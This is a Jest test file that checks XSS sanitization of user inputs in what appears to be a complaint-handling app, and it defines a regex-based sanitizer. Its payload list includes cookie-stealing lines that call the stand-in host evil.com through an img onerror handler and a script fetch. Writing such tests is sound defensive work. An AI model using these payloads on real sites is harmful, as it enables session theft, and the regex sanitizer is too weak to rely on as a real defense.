import { describe, it, expect } from '@jest/globals';

/**
 * Cross-Site Scripting (XSS) Prevention Tests
 * 
 * These tests verify that the application properly sanitizes user inputs
 * and prevents XSS attacks through various attack vectors.
 */

describe('XSS Prevention', () => {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror="alert(1)">',
    '<svg onload="alert(1)">',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(1)">',
    '<body onload="alert(1)">',
    '<input onfocus="alert(1)" autofocus>',
    '<marquee onstart="alert(1)">',
    '<details open ontoggle="alert(1)">',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src="x" onerror="this.src=\'https://evil.com/steal?c=\'+document.cookie">',
    '<a href="javascript:void(0)" onclick="alert(1)">Click</a>',
  ];

  describe('Complaint Description Sanitization', () => {
    xssPayloads.forEach((payload) => {
      it(`should sanitize XSS payload: ${payload.substring(0, 30)}...`, () => {
        const sanitized = sanitizeText(payload);
        
        // Should not contain script tags
        expect(sanitized).not.toMatch(/<script/i);
        expect(sanitized).not.toMatch(/<\/script>/i);
        
        // Should not contain event handlers
        expect(sanitized).not.toMatch(/on\w+=/i);
        
        // Should not contain javascript: protocol
        expect(sanitized).not.toMatch(/javascript:/i);
        
        // Should not contain iframe
        expect(sanitized).not.toMatch(/<iframe/i);
      });
    });
  });

  describe('Chat Message Sanitization', () => {
    xssPayloads.forEach((payload) => {
      it(`should sanitize XSS in chat: ${payload.substring(0, 30)}...`, () => {
        const sanitized = sanitizeText(payload);
        
        // Verify all dangerous tags are removed
        expect(sanitized).not.toMatch(/<(script|iframe|object|embed|applet)/i);
        
        // Verify event handlers are removed
        expect(sanitized).not.toMatch(/on\w+\s*=/i);
        
        // Content should still be somewhat readable (not completely empty)
        expect(sanitized.length).toBeGreaterThanOrEqual(0);
      });
    });
  });

  describe('Feedback Comment Sanitization', () => {
    it('should sanitize malicious feedback comments', () => {
      const maliciousComment = '<script>fetch("https://evil.com/steal?data=" + document.cookie)</script>';
      const sanitized = sanitizeText(maliciousComment);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('fetch');
      expect(sanitized).not.toContain('document.cookie');
    });

    it('should preserve safe HTML entities', () => {
      const safeText = 'This is a &lt;safe&gt; comment with &amp; symbols';
      const sanitized = sanitizeText(safeText);
      
      expect(sanitized).toBe(safeText);
    });
  });

  describe('Admin Response Sanitization', () => {
    it('should sanitize admin responses before displaying to users', () => {
      const adminResponse = 'Please update <script>alert("xss")</script> your information';
      const sanitized = sanitizeText(adminResponse);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('Please update');
      expect(sanitized).toContain('your information');
    });
  });

  describe('URL Validation', () => {
    it('should reject javascript: protocol URLs', () => {
      const maliciousUrl = 'javascript:alert("XSS")';
      const isValid = validateUrl(maliciousUrl);
      
      expect(isValid).toBe(false);
    });

    it('should reject data: protocol URLs with scripts', () => {
      const maliciousUrl = 'data:text/html,<script>alert("XSS")</script>';
      const isValid = validateUrl(maliciousUrl);
      
      expect(isValid).toBe(false);
    });

    it('should allow safe HTTP/HTTPS URLs', () => {
      const safeUrl = 'https://example.com/page';
      const isValid = validateUrl(safeUrl);
      
      expect(isValid).toBe(true);
    });
  });

  describe('HTML Attribute Injection', () => {
    it('should prevent attribute injection in user names', () => {
      const maliciousName = 'John" onload="alert(1)" data-test="';
      const sanitized = sanitizeText(maliciousName);
      
      expect(sanitized).not.toMatch(/onload=/i);
      expect(sanitized).not.toContain('"');
    });

    it('should prevent style attribute injection', () => {
      const maliciousStyle = 'color: red; background: url("javascript:alert(1)")';
      const sanitized = sanitizeText(maliciousStyle);
      
      expect(sanitized).not.toMatch(/javascript:/i);
    });
  });
});

// Sanitization function (mirrors actual implementation)
function sanitizeText(text: string): string {
  // Remove script tags
  let sanitized = text.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
  
  // Remove event handlers
  sanitized = sanitized.replace(/on\w+\s*=\s*["'][^"']*["']/gi, '');
  sanitized = sanitized.replace(/on\w+\s*=\s*[^\s>]*/gi, '');
  
  // Remove javascript: protocol
  sanitized = sanitized.replace(/javascript:/gi, '');
  
  // Remove dangerous tags
  sanitized = sanitized.replace(/<(iframe|object|embed|applet|meta|link|style)[^>]*>/gi, '');
  
  // Remove closing tags for dangerous elements
  sanitized = sanitized.replace(/<\/(iframe|object|embed|applet|meta|link|style)>/gi, '');
  
  return sanitized.trim();
}

function validateUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    const allowedProtocols = ['http:', 'https:', 'mailto:'];
    return allowedProtocols.includes(parsed.protocol);
  } catch {
    return false;
  }
}
